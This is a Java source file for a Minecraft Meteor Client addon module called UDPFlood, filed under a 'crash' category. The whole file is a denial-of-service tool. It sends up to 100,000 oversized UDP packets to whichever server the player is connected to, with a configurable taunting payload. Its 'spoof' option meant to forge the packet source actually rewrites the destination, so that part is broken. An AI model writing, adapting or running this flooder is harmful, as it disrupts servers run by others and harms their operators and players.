package com.crystaldevs.crystal.modules.crash;

import com.crystaldevs.crystal.CrystalAddon;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.network.MeteorExecutor;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.network.ServerAddress;
import net.minecraft.client.network.ServerInfo;
import org.jetbrains.annotations.NotNull;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.nio.charset.StandardCharsets;

public class UDPFlood extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<String> payloadString = sgGeneral.add(new StringSetting.Builder()
            .name("payload")
            .description("The custom payload to be sent to the server.")
            .defaultValue("This server is currently being ran by crystal addon")
            .build()
    );

    private final Setting<Integer> requestCount = sgGeneral.add(new IntSetting.Builder()
            .name("requests")
            .description("The amount of requests to be sent to the server.")
            .sliderMin(1)
            .min(1)
            .sliderMax(100000)
            .defaultValue(100)
            .build()
    );

    private final Setting<Integer> requestRepeatCount = sgGeneral.add(new IntSetting.Builder()
            .name("requests-repeat-multiplier")
            .description("The number of times your payload string should be duplicated before being sent.")
            .sliderMin(1)
            .min(1)
            .sliderMax(100000)
            .defaultValue(100)
            .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("auto-disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build()
    );

    private final Setting<Boolean> UDPSpoof = sgGeneral.add(new BoolSetting.Builder()
            .name("UDP-spoof")
            .description("Spoofs the details sent in the packet.")
            .defaultValue(false)
            .build()
    );

    private final Setting<String> spoofedIp = sgGeneral.add(new StringSetting.Builder()
            .name("spoofed-IP")
            .description("The spoofed IP the packet is sent from.")
            .defaultValue("127.0.0.1")
            .visible(UDPSpoof::get)
            .build()
    );

    private final Setting<Integer> spoofedPort = sgGeneral.add(new IntSetting.Builder()
            .name("spoofed-port")
            .description("The spoofed port the packet is sent from.")
            .defaultValue(25565)
            .visible(UDPSpoof::get)
            .sliderMin(0)
            .sliderMax(65535)
            .build()
    );

    public UDPFlood() {
        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY, "UDP-flood", "CRYSTAL || Floods the server with UDP requests+.");
    }

    @Override
    public void onActivate() {
        if (mc.player != null) {
            if (mc.getCurrentServerEntry() != null) {
                ServerInfo server = mc.getCurrentServerEntry();
                try {
                    String serverIp = ServerAddress.parse(server.address).getAddress();
                    int serverPort = ServerAddress.parse(server.address).getPort();
                    info("Starting UDP Flooder on server: " + serverIp + ":" + serverPort);
                    MeteorExecutor.execute(() -> floodServer(serverIp, serverPort));
                } catch (Exception e) {
                    error("Error in obtaining server IP. Please check your connection, toggling.");
                    toggle();
                }
            } else {
                error("The server is null.");
                toggle();
            }
        }
    }

    private void floodServer(String serverIp, int serverPort) {
        int totalDataSent = 0;
        boolean allPacketsSent = true;
        try (DatagramSocket socket = new DatagramSocket()) {
            byte[] payload = payloadString.get().repeat(requestRepeatCount.get()).getBytes(StandardCharsets.UTF_8);

            if (!isValidIpAddress(serverIp)) {
                error("Invalid server IP. Please check the IP address. You must be on a server with an IP. Not a domain.");
                toggle();
                return;
            }

            InetAddress serverAddress = InetAddress.getByName(serverIp);

            for (int i = 0; i < requestCount.get(); i++) {
                DatagramPacket packet = new DatagramPacket(payload, payload.length, serverAddress, serverPort);
                if (UDPSpoof.get()) {
                    packet.setAddress(InetAddress.getByName(spoofedIp.get()));
                    packet.setPort(spoofedPort.get());
                    socket.send(packet);
                } else socket.send(packet);
                totalDataSent += payload.length;
            }
        } catch (IOException e) {
            error("Error occurred: " + e + ", toggling.");
            allPacketsSent = false;
            toggle();
        }

        if (allPacketsSent) {
            info(" - UDP - ");
            info("Server IP: " + serverIp);
            info("Server Port: " + serverPort);
            info("Total data sent: " + formatData(totalDataSent));
            toggle();
        }
    }

    private boolean isValidIpAddress(@NotNull String ipAddress) {
        String[] parts = ipAddress.split("\\.");
        if (parts.length != 4) return false;

        for (String part : parts) {
            try {
                int num = Integer.parseInt(part);
                if (num < 0 || num > 255) return false;
            } catch (NumberFormatException e) {
                return false;
            }
        }
        return true;
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    private String formatData(long bytes) {
        double kilobytes = bytes / 1000.0;
        double megabytes = kilobytes / 1000.0;
        double gigabytes = megabytes / 1000.0;

        if (gigabytes >= 1.0) return String.format("%.2f GB", gigabytes);
        else if (megabytes >= 1.0) return String.format("%.2f MB", megabytes);
        else if (kilobytes >= 1.0) return String.format("%.2f KB", kilobytes);
        else return bytes + " bytes";
    }
}